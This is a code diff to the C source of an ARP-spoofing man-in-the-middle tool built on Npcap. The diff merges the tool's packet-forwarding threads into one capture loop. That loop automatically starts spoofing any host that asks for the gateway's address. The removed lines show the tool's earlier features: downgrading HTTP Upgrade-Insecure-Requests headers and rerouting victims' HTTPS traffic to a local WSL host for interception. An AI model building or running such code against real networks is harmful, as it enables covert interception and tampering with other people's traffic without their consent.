@@ -6,6 +6,7 @@
 #include "packet.h"
 #include "spoof.h"
 #include "globals.h"
+#include "channelling.h"
 
 // System Specific
 HANDLE hBackwardThread, hForwardThread;
@@ -30,7 +31,8 @@ BOOL LoadNpcapDlls()
 
 // Statics
 
-BOOL enableAutoSpoof = FALSE;
+static bool enableAutoSpoof = false;
+static bool shouldExitProgram = false;
 
 // Logics
 
@@ -38,18 +40,10 @@ void init_addrs();
 void on_sig_int(int sig);
 void manual_setup_spoof(uint32_t targetIp);
 void enable_auto_spoof(BOOL value) { enableAutoSpoof = value; }
+void discovery_packet_handler(u_char *argument, const struct pcap_pkthdr *packet_heaher, const unsigned char *packet_content);
 
-void run_forward_loop();
-void run_backward_loop();
-void forward_loop_handler(unsigned char *argument, const struct pcap_pkthdr *packet_heaher, const unsigned char *packet_content);
-void backward_loop_handler(unsigned char *argument, const struct pcap_pkthdr *packet_heaher, const unsigned char *packet_content);
+pcap_t *mainDevice;
 
-typedef struct
-{
-    pcap_t *wlanDevice;
-    pcap_t *vEtherDevice;
-} PcapChannel;
-PcapChannel forwardChannel, backwardChannel;
 int main(int argc, char **argv)
 {
     char errbuf[PCAP_BUF_SIZE];
@@ -62,31 +56,25 @@ int main(int argc, char **argv)
 
     init_addrs();
 
-    forwardChannel.vEtherDevice = pcap_open(VETHER_DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf);
-    backwardChannel.vEtherDevice = pcap_open(VETHER_DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf);
-    if (forwardChannel.vEtherDevice == NULL || backwardChannel.vEtherDevice == NULL)
+    // manual_setup_spoof(inet_addr("192.168.43.11"));
+
+    mainDevice = pcap_open(WLAN_DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf);
+    if (mainDevice == NULL)
     {
         LOG("Failed:%s\n", errbuf)
         exit(1);
     }
 
-    manual_setup_spoof(inet_addr("192.168.43.11"));
-    forwardChannel.wlanDevice = pcap_open(WLAN_DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf);
-    backwardChannel.wlanDevice = pcap_open(WLAN_DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf);
-    if (forwardChannel.wlanDevice == NULL || backwardChannel.wlanDevice == NULL)
-    {
-        LOG("Failed:%s\n", errbuf)
-        exit(1);
-    }
     // pcap_dumper_t *dumpDevice = pcap_dump_open(mainDevice, "dump.pcap");
 
-    run_forward_loop();
-    run_backward_loop();
     LOG("Capture started");
-
     signal(SIGINT, on_sig_int);
 
-    Sleep(INFINITE);
+    if (pcap_loop(mainDevice, -1, discovery_packet_handler, NULL))
+    {
+        LOG("Failed:%s\n", errbuf)
+        exit(1);
+    }
 }
 
 void init_addrs()
@@ -180,64 +168,12 @@ void init_addrs()
         free(pAdapterInfo);
 }
 
-void handleHttp(pcap_t *device, TcpPacket *tcpPacket, uint16_t len)
+void discovery_packet_handler(u_char *argument, const struct pcap_pkthdr *packet_heaher, const unsigned char *packet_content)
 {
-    if (!len)
+    if (shouldExitProgram)
+    {
         return;
-    uint8_t *payload = tcpPacket->payload;
-    char *pos = NULL;
-    if (pos = strstr(payload, "Upgrade-Insecure-Requests"))
-    {
-        uint8_t *lineEnd = (uint8_t *)strstr(pos, "\r\n"); // It should always be
-        if (*(lineEnd - 1) == '1')                         // found
-        {
-            TcpPacket *newPacket = malloc(sizeof(TcpPacket) + len);
-            memcpy(newPacket, tcpPacket, sizeof(TcpPacket));
-            memcpy(newPacket->payload, payload, len);
-            memcpy(newPacket->ether.ether_dhost, gateMacAddr, 6);
-            *(newPacket->payload + (lineEnd - payload) - 1) = '0';
-            newPacket->tcp.checksum = TcpChecksum(newPacket);
-            pcap_sendpacket(device, (const uint8_t *)newPacket, sizeof(TcpPacket) + len);
-            free(newPacket);
-        }
     }
-    else
-    {
-        pcap_sendpacket(device, (const uint8_t *)tcpPacket, sizeof(TcpPacket) + len);
-    }
-    return;
-}
-
-bool isMacSpoofed(const uint8_t *mac)
-{
-    for (int i = 0; i < spoofedTop; i++)
-    {
-        if (memcmp(mac, spoofedMachines[i].MacAddress, 6) == 0)
-        {
-            return true;
-        }
-    }
-    return false;
-}
-int findSpoofedMachine(const uint32_t ip)
-{
-    for (int i = 0; i < spoofedTop; i++)
-    {
-        uint32_t addr = spoofedMachines[i].IpAddress;
-        if (ip == addr)
-        {
-            return i;
-        }
-    }
-    return -1;
-}
-
-void forward_loop_handler(unsigned char *argument, const struct pcap_pkthdr *packet_header, const unsigned char *packet_content)
-{
-    pcap_t *retransmitDevice = forwardChannel.vEtherDevice;
-    pcap_t *mainDevice = forwardChannel.wlanDevice;
-
-    // u_char *dumpDevice = argument;
     const EthernetPacket *ethPacket = NULL;
     ethPacket = (EthernetPacket *)packet_content;
     if (!memcmp(ethPacket->header.ether_shost, localMacAddr, MACADDR_LEN)) // Packet sent by us
@@ -247,7 +183,6 @@ void forward_loop_handler(unsigned char *argument, const struct pcap_pkthdr *pac
     }
 
     uint32_t arp = ntohs(0x0806);
-    uint32_t ipv4 = ntohs(0x0800);
     if (ethPacket->header.ether_type == arp) // arp
     {
         ArpPacket *arpPacket = (ArpPacket *)ethPacket;
@@ -256,138 +191,10 @@ void forward_loop_handler(unsigned char *argument, const struct pcap_pkthdr *pac
             if (arpPacket->arp.ar_tip == gateAddr)
             // We got an newbie, spoof it
             {
-                CreateSpoofThread(arpPacket->arp.ar_sha, arpPacket->arp.ar_sip);
+                CreateSpoofSession(arpPacket->arp.ar_sha, arpPacket->arp.ar_sip);
                 return;
             }
         }
-    }
-    else if (ethPacket->header.ether_type == ipv4) // IPv4
-    {
-        Ipv4Packet *ipv4Packet = (Ipv4Packet *)ethPacket;
-        if (ipv4Packet->ipv4.proto == 6) // TCP
-        {
-            TcpPacket *tcpPacket = (TcpPacket *)ethPacket;
-            uint16_t sourcePort = ntohs(tcpPacket->tcp.src_port);
-            uint16_t destPort = ntohs(tcpPacket->tcp.dst_port);
-            if (sourcePort == 80 || destPort == 80) // HTTP
-            {
-                // pcap_dump(dumpDevice, packet_header, packet_content);
-                uint16_t len = ntohs(ipv4Packet->ipv4.len) - sizeof(ipv4Packet->ipv4) - (tcpPacket->tcp.data_off_set >> 4 << 2);
-                // uint16_t checksum = TcpChecksum(tcpPacket);
-                // uint16_t ipchecksum = Ipv4Checksum(ipv4Packet);
-                // handleHttp(tcpPacket, len);
-                return;
-            }
-            if (destPort == 443) // HTTPS
-            {
-                // pcap_dump(dumpDevice, packet_header, packet_content);
-                uint8_t *pkt = malloc(packet_header->len);
-                memcpy(pkt, packet_content, packet_header->len);
-                TcpPacket *modified = (TcpPacket *)pkt;
-                memcpy(modified->ether.ether_shost, wslHostAddr, MACADDR_LEN);
-                memcpy(modified->ether.ether_dhost, wslAddr, MACADDR_LEN);
-                modified->ipv4.dst = ipWsl;
-                modified->ipv4.checksum = Ipv4Checksum((Ipv4Packet *)modified);
-                modified->tcp.checksum = TcpChecksum(modified);
-                int res = pcap_sendpacket(retransmitDevice, pkt, packet_header->len);
-                free(pkt);
-            }
-        }
-    }
-    if (isMacSpoofed(ethPacket->header.ether_shost))
-    {
-        uint8_t *pkt = malloc(packet_header->len);
-        memcpy(pkt, packet_content, packet_header->len);
-        pcap_sendpacket(mainDevice, pkt, packet_header->len);
-        free(pkt);
-    }
-}
-void backward_loop_handler(unsigned char *argument, const struct pcap_pkthdr *packet_header, const unsigned char *packet_content)
-{
-    const EthernetPacket *ethPacket = NULL;
-    ethPacket = (EthernetPacket *)packet_content;
-    if (!memcmp(ethPacket->header.ether_shost, wslHostAddr, MACADDR_LEN)) // Packet sent by us
-    {
-        // ignore it
-        return;
-    }
-
-    uint32_t arp = ntohs(0x0806);
-    uint32_t ipv4 = ntohs(0x0800);
-    if (ethPacket->header.ether_type == ipv4) // IPv4
-    {
-        Ipv4Packet *ipv4Packet = (Ipv4Packet *)ethPacket;
-        if (ipv4Packet->ipv4.proto == 6) // TCP
-        {
-            TcpPacket *tcpPacket = (TcpPacket *)ethPacket;
-            uint16_t sourcePort = ntohs(tcpPacket->tcp.src_port);
-            uint16_t destPort = ntohs(tcpPacket->tcp.dst_port);
-            if (sourcePort == 80 || destPort == 80) // HTTP
-            {
-                // pcap_dump(dumpDevice, packet_header, packet_content);
-                uint16_t len = ntohs(ipv4Packet->ipv4.len) - sizeof(ipv4Packet->ipv4) - (tcpPacket->tcp.data_off_set >> 4 << 2);
-                // uint16_t checksum = TcpChecksum(tcpPacket);
-                // uint16_t ipchecksum = Ipv4Checksum(ipv4Packet);
-                // handleHttp(tcpPacket, len);
-                return;
-            }
-            int index = -1;
-            if (sourcePort == 443 && (index = findSpoofedMachine(ipv4Packet->ipv4.dst)) != -1) // HTTPS
-            {
-                // pcap_dump(dumpDevice, packet_header, packet_content);
-                uint8_t *pkt = malloc(packet_header->len);
-                memcpy(pkt, packet_content, packet_header->len);
-                TcpPacket *modified = (TcpPacket *)pkt;
-                memcpy(modified->ether.ether_shost, localMacAddr, MACADDR_LEN);
-                memcpy(modified->ether.ether_dhost, spoofedMachines[index].MacAddress, MACADDR_LEN);
-                modified->ipv4.src = gateAddr;
-                modified->ipv4.checksum = Ipv4Checksum((Ipv4Packet *)modified);
-                modified->tcp.checksum = TcpChecksum(modified);
-                int res = pcap_sendpacket(backwardChannel.wlanDevice, pkt, packet_header->len);
-                free(pkt);
-            }
-        }
-    }
-}
-
-unsigned long forward_thread_proc(void *arg)
-{
-    int res = 0;
-    struct pcap_pkthdr *hdr;
-    const u_char *pktdata;
-    while (res = pcap_next_ex(forwardChannel.wlanDevice, &hdr, &pktdata) >= 0 && !exitFlag)
-    {
-        forward_loop_handler(NULL, hdr, pktdata);
-    }
-}
-void run_forward_loop()
-{
-    DWORD threadId;
-    hForwardThread = CreateThread(NULL, 0, forward_thread_proc, NULL, 0, &threadId);
-    if (!hForwardThread)
-    {
-        LOG("Error:Create forward thread failed!");
-        exit(1);
-    }
-}
-unsigned long backward_thread_proc(void *arg)
-{
-    int res = 0;
-    struct pcap_pkthdr *hdr;
-    const u_char *pktdata;
-    while (res = pcap_next_ex(backwardChannel.vEtherDevice, &hdr, &pktdata) >= 0 && !exitFlag)
-    {
-        backward_loop_handler(NULL, hdr, pktdata);
-    }
-}
-void run_backward_loop()
-{
-    DWORD threadId;
-    hBackwardThread = CreateThread(NULL, 0, backward_thread_proc, NULL, 0, &threadId);
-    if (!hBackwardThread)
-    {
-        LOG("Error:Create backward thread failed!");
-        exit(1);
     }
 }
 
@@ -405,23 +212,15 @@ void manual_setup_spoof(uint32_t targetIp)
         return;
     }
 
-    CreateSpoofThread(targetMac, targetIp);
+    CreateSpoofSession(targetMac, targetIp);
 }
 
 void on_sig_int(int sig)
 {
-    exitFlag = true;
+    shouldExitProgram = true;
     printf("Shutting down...");
-
-    ShutdownSpoofThreads();
-
-    WaitForSingleObject(hForwardThread, -1);
-    WaitForSingleObject(hBackwardThread, -1);
-
-    pcap_close(forwardChannel.vEtherDevice);
-    pcap_close(backwardChannel.vEtherDevice);
-    pcap_close(forwardChannel.wlanDevice);
-    pcap_close(backwardChannel.wlanDevice);
+    for (int i = 0; i < spoofSessionTop; i++)
+        ShutdownSpoofSession(&spoofSessions[i]);
 
     exit(0);
 }
